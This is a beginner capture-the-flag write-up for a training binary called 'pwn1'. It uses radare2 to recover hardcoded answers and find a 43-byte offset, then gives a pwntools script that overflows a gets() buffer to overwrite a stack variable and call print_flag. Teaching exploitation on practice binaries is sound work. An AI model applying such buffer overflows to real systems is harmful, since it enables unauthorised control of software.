# PWN 1 - Basic Memory Overwrite 

For this challenge, we will be using radare2 and pwn tools. I am assuming you are a complete pwn beginner, but are at least mildly comfortable with using the command line. 

Before attempting this challenge, be sure to install [radare](https://rada.re/r/down.html) and [pwntools](http://docs.pwntools.com/en/stable/install.html). 

For many pwn-training problems, you should also create a dummy flag.txt file in the same directory of your binary you are trying to exploit, with a flag of, well, whatever you want. When you effectively "pwn" a binary, it will often try to open a flag.txt file. To avoid errors, be sure to have a flag.txt file handy. This will also help you verify that you have solved the problem. 

I like to keep it simple. Here is my flag.txt file.

```
flag{you_got_the_flag!}
```

Now that you have those tools installed, let's get cracking. I encourage you to attempt this problem on your own, and only refer to this writeup after you have solved it, or you really need help (it's totally okay to!).

Let's run this program and see what it gives us. 

```
./pwn1
```

It gives us the following prompt:

```
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
```

Entering some random input gives us the following message:

```
I don't know that! Auuuuuuuugh!
```

Okay, funny. So based on this response, we can deduce that it is looking for a particular input so it can give us something. But what that something is, we don't know, but we do know that we want a flag. 

Let's whip up radare now, shall we?

```
r2 -Ad ./pwn1
```

The "A" flag stands for "analyze" and the "d" flag puts radare in debug mode. Lastly, we specify the binary we want to look at, which in this case, is pwn1. 

You will get something like the following output (just so you can check).

```
Process with PID 2262 started...
= attach 2262 2262
bin.baddr 0x56601000
Using 0x56601000
asm.bits 32
glibc.fc_offset = 0x00148
Warning: r_bin_file_hash: file exceeds bin.hashlimit
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- Using radare2 to generate intelligence ...
[0xf7f60c70]> 
```

Most binaries will have a "main" function, so let's "seek" the memory address that main is at so we can start dissecting this binary.

```
s main
```

Notice how the memory address next to your cursor in the terminal has changed. Cool!

Now let's enter visual mode and comb through some assembly code.

```
Vpp
```

Here, I encourage you to get more comfortable with the binary and scroll through the main function and analyze it. To sum things up, you should see an instance of gets being called (to take in user input - also note that when you see gets in binaries in CTF problems, usually there's something you ought to exploit, gets is a vulnerable function that fails to protect against buffer overflows), followed by a strcmp, then another gets, followed by a strcmp.

You should have counted three instances of gets being called, but wait, only two instances of strcmp??? What gives????

Did you see anything interesting after that third gets? We see that a print_flag function is called, but how do we get to be called? 

Let's take a closer look at this assembly.

```
            0x566018a6      8d45c5         lea eax, [var_3bh]                                                                                                  
            0x566018a9      50             push eax     
	    0x566018aa      e871fcffff     call sym.imp.gets           ;[1] ; char *gets(char *s)                                                              
│           0x566018af      83c410         add esp, 0x10                                                                                                       
│           0x566018b2      817df0c810a1.  cmp dword [var_10h], 0xdea110c8                                                                                     
│       ┌─< 0x566018b9      7507           jne 0x566018c2                                                                                                      
│       │   0x566018bb      e83dfeffff     call sym.print_flag         ;[2]                                                                                    
│      ┌──< 0x566018c0      eb12           jmp 0x566018d4                                                                                                      
│      │└─> 0x566018c2      83ec0c         sub esp, 0xc                                                                                                        
│      │    0x566018c5      8d837ceaffff   lea eax, [ebx - 0x1584]                                                                                             
│      │    0x566018cb      50             push eax                                                                                                            
│      │    0x566018cc      e87ffcffff     call sym.imp.puts           ;[3] ; int puts(const char *s)     
```

So the gets function is called, and then we see a comparison between the variable var_10h and 0xdea110c8. So, if you notice, if these two values are not equal, we jump over the print_flag function. If they are equal, then print_flag is called. 

But then you might think, well what gives? If you noticed, when the program accepts user input, that user input is stored in var_3bh, not var_10h. So how on earth are we going to get print_flag to run????? 

Before we think about getting print_flag to run, we need to get past that first prompt that asks for our name.

To get past that first prompt, we know that the program does a strcmp, meaning that there is probably a string lurking inside of the binary that we need to enter. 

To see the grouping of namespaces (flags) in the binary (I will be linking a tutorial at the end that goes more in detail about what this is), type the following:

```
fs
```

You should see something like the following output:

```
    7 . classes
    2 . functions
   16 . imports
   11 . regs
   16 . relocs
   29 . sections
   10 . segments
    9 . strings
   36 * symbols
   25 . symbols.sections
```

Hmmm, see how there is a "strings" namespace? To see what lives in that namespace, type the following:

```
fs strings; f
```

Let's take a look at our output:

```
0x56601970 19 str.Right._Off_you_go.
0x56601985 9 str.flag.txt
0x56601990 107 str.Stop__Who_would_cross_the_Bridge_of_Death_must_answer_me_these_questions_three__ere_the_other_side_he_see.
0x566019fb 22 str.What..._is_your_name
0x56601a11 25 str.Sir_Lancelot_of_Camelot
0x56601a2c 32 str.I_don_t_know_that__Auuuuuuuugh
0x56601a4c 23 str.What..._is_your_quest
0x56601a63 25 str.To_seek_the_Holy_Grail.
0x56601a7c 22 str.What..._is_my_secret
```

On the left, we see memory addresses, and on the right, we see the names that represent our strings. 

Let's print a string stored at two of those memory addresses. 

```
ps @ 0x56601a11
Sir Lancelot of Camelot

ps @ 0x56601a63
To seek the Holy Grail.
```

We can infer that there are two prompts for us to answer, and that these are our two answers, fitting with our first two gets function calls we have learned about from earlier. There is no string for the third prompt, which seems to read "What is my secret?" 

But for now, let's verify that our first two answers work. 

To get the program running, type the following:

```
dc
```

Now go ahead and enter the answers we have found to the two prompts... 

```
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
What... is your quest?
To seek the Holy Grail.
What... is my secret?
idk                                    
I don't know that! Auuuuuuuugh!
```

Progress! But what do we do for the last prompt???

The title of the problem gives us a hint - "Basic Memory Overwrite."

Did you notice anything peculiar about the variables in main? Go back into visual mode and inspect the variables.

```
362: int main (int argc, char **argv, char **envp);                                                                                                          
│           ; var int32_t var_3bh @ ebp-0x3b                                                                                                                   
│           ; var int32_t var_10h @ ebp-0x10                                                                                                                   
│           ; var int32_t var_ch @ ebp-0xc                                                                                                                     
│           ; var int32_t var_8h @ ebp-0x8                                                                                                                     
│           ; arg int32_t arg_4h @ esp+0x64

```

Think about this. Variables are pushed onto the stack in the reverse of the order they were initialized (in x86 32-bit calling convention). 

So while var_3bh was intitialized first, and var_8h was initialized last, the stack will actually look like this...

```
HIGH MEMORY ADDRESSES
---- TOP ----
-> var_8h
-> var_ch
-> var_10h
-> var_3bh
-- BOTTOM ---
LOWER MEMORY ADDRESSES
```

In x86, the stack grows down from highier memory addresses to lower memory addresses. But, when the program takes input and stores those values, the variable is filled from lower memory addresses to high memory addresses. See [this image](https://www.coengoedegebure.com/buffer-overflow-attacks-explained/) for a visual. 

So, knowing that var_3bh is below var_10h on the stack, and we need the value of var_10h to equal 0xdea110c8, we can do some evil and give an input that spills out of the space allocated for var_3bh and into var_10h. 

Now, all we need to figure out is how much of a "buffer" we need to write into var_3bh to spill into var_10h. 

For these types of problems, you want to use some sort of pattern that lets you recognize when your input spills over. 

I like to use repeating letters of the alphabet. 

I like to whip up an instance of ipython and do the following (if I don't have it handy already).

```

In [6]: import string

In [7]: string.ascii_lowercase
Out[7]: 'abcdefghijklmnopqrstuvwxyz'

In [8]: word = ''

In [9]: for char in list(string.ascii_lowercase):
   ...:     word += char * 4
   ...:     
   ...: print word
   ...: 
   ...:     
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
```

To make the program stop at a certain point after it executes, we can set a breakpoint somehwere. Let's set a breakpoint right when it compares var_10h. 

```
db 0x566018b2
```

```
dc 
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
What... is your quest?
To seek the Holy Grail.
What... is my secret?
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
hit breakpoint at: 566088b2
```

The command afvd will show us the variables and their values at our breakpoint...

```
[0x566088b2]> afvd
var var_ch = 0xff8af8bc = 1835887980
var var_10h = 0xff8af8b8 = 1819044971
var var_3bh = 0xff8af88d = 1633771873
var var_8h = 0xff8af8c0 = 1852730989
arg arg_4h = 0xff8af884 = 4287299725
```

But this isn't too useful. We can use afv* and some handwavy magic to see some better output (bear with me here, to figure out what commands do more in depth, at some point ya gotta do it, people can't totally hold your hand forever!). 

```
[0x566188b2]> .afv*
[0x566188b2]> pxw @ fcnvar.var_3bh
0xffbe1d9d  0x61616161 0x62626262 0x63636363 0x64646464  aaaabbbbccccdddd
0xffbe1dad  0x65656565 0x66666666 0x67676767 0x68686868  eeeeffffgggghhhh
0xffbe1dbd  0x69696969 0x6a6a6a6a 0x6b6b6b6b 0x6c6c6c6c  iiiijjjjkkkkllll
0xffbe1dcd  0x6d6d6d6d 0x6e6e6e6e 0x6f6f6f6f 0x70707070  mmmmnnnnoooopppp
0xffbe1ddd  0x71717171 0x72727272 0x73737373 0x74747474  qqqqrrrrsssstttt
0xffbe1ded  0x75757575 0x76767676 0x77777777 0x78787878  uuuuvvvvwwwwxxxx
0xffbe1dfd  0x79797979 0x7a7a7a7a 0x00ffbe00 0x5af7eae0  yyyyzzzz.......Z
0xffbe1e0d  0x80f7ee67 0x00ffbe1e 0x00000000 0x00f7eae0  g...............
0xffbe1e1d  0x00000000 0xd8000000 0xc8139049 0x00f2772f  ........I.../w..
0xffbe1e2d  0x00000000 0x00000000 0x40000000 0x24000000  ...........@...$
0xffbe1e3d  0x00f7efe0 0x00000000 0x69000000 0xb0f7ee68  ...........ih...
0xffbe1e4d  0x0156619f 0xc0000000 0x00566185 0xf1000000  .aV......aV.....
0xffbe1e5d  0x79566185 0x01566187 0x84000000 0xf0ffbe1e  .aVy.aV.........
0xffbe1e6d  0x50566188 0xb0566189 0x7cf7ee69 0x40ffbe1e  .aVP.aV.i..|...@
0xffbe1e7d  0x01f7efe9 0x8d000000 0x00ffbe20 0xcd000000  ........ .......
0xffbe1e8d  0xb9ffbe20 0xdbffbe26 0xf2ffbe26 0x03ffbe26   ...&...&...&...
```

Cool, so we see that we have at least written into var_3bh. What about var_10h? Let's check that out. 

```
[0x566188b2]> pxw @ fcnvar.var_10h
0xffbe1dc8  0x6c6c6c6b 0x6d6d6d6c 0x6e6e6e6d 0x6f6f6f6e  kllllmmmmnnnnooo
0xffbe1dd8  0x7070706f 0x71717170 0x72727271 0x73737372  oppppqqqqrrrrsss
0xffbe1de8  0x74747473 0x75757574 0x76767675 0x77777776  sttttuuuuvvvvwww
0xffbe1df8  0x78787877 0x79797978 0x7a7a7a79 0xffbe007a  wxxxxyyyyzzzz...
0xffbe1e08  0xf7eae000 0xf7ee675a 0xffbe1e80 0x00000000  ....Zg..........
0xffbe1e18  0xf7eae000 0x00000000 0x00000000 0x139049d8  .............I..
0xffbe1e28  0xf2772fc8 0x00000000 0x00000000 0x00000000  ./w.............
0xffbe1e38  0x00000040 0xf7efe024 0x00000000 0x00000000  @...$...........
0xffbe1e48  0xf7ee6869 0x56619fb0 0x00000001 0x566185c0  ih....aV......aV
0xffbe1e58  0x00000000 0x566185f1 0x56618779 0x00000001  ......aVy.aV....
0xffbe1e68  0xffbe1e84 0x566188f0 0x56618950 0xf7ee69b0  ......aVP.aV.i..
0xffbe1e78  0xffbe1e7c 0xf7efe940 0x00000001 0xffbe208d  |...@........ ..
0xffbe1e88  0x00000000 0xffbe20cd 0xffbe26b9 0xffbe26db  ..... ...&...&..
0xffbe1e98  0xffbe26f2 0xffbe2703 0xffbe2712 0xffbe2729  .&...'...'..)'..
0xffbe1ea8  0xffbe2734 0xffbe274e 0xffbe2778 0xffbe2782  4'..N'..x'...'..
0xffbe1eb8  0xffbe2796 0xffbe27a1 0xffbe27c3 0xffbe27ec  .'...'...'...'..
```

We see that we have written into var_10h after the third "k" in our pattern. So, the fourth k begins to write into var_10h. 

Let's check the length of our buffer using python.

```
In [12]: len("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkk")
Out[12]: 43
```

So it takes 43 characters to totally write into var_3bh and then the 44th character will spill over into var_10h. 

Using pwntools, let us write our exploit! We will save it in a file called exploit.py.

Our exploit:

```
#!/usr/bin/env python2

from pwn import *

#start the ./pwn1 process and save it in variable p
p = process('./pwn1')

#this is our buffer to totally write into var_3bh
bufferBeforeOverwrite = "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkk"

#this is the value we write into var_10h, p32 as a function ensure that we are sending 32 bytes, and also packs up whatever value we want to send into little-endian
valueToSendForOverwrite = p32(0xdea110c8)

#this is our input we are sending on the third prompt

exploitToSend = bufferBeforeOverwrite + valueToSendForOverwrite

#receive until this phrase
print(p.recvuntil('name?'))

#what to send in response

print(p.sendline('Sir Lancelot of Camelot'))

print(p.recvuntil('quest?'))

print(p.sendline('To seek the Holy Grail.'))

print(p.recvuntil('secret?'))

print(p.sendline(exploitToSend))

#receive whatever the program sends us after we send our exploit input!!
print(p.recv())
print(p.recv())
```

```
python exploit.py

[+] Starting local process './pwn1': pid 6972
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
None

What... is your quest?
None

What... is my secret?
None


[*] Process './pwn1' stopped with exit code 0 (pid 6972)
Right. Off you go.
flag{you_got_the_flag!}

```

Yee, we got the flag!!!!!!!!!

I hope you enjoyed this writeup, and to really understand this problem, make sure you can do it on your own without the help of a writeup. It personally took me a while, but don't give up!

## Some handy resources to feed your brain  
- [Super awesome radare tutorial that I always refer to](https://www.megabeets.net/a-journey-into-radare-2-part-1/)
- [Buffer overflow attacks explained](https://www.coengoedegebure.com/buffer-overflow-attacks-explained/)
- [Why the stack grows down](https://gist.github.com/cpq/8598782)
- [The 32 bit x86 C Calling Convention](https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf)
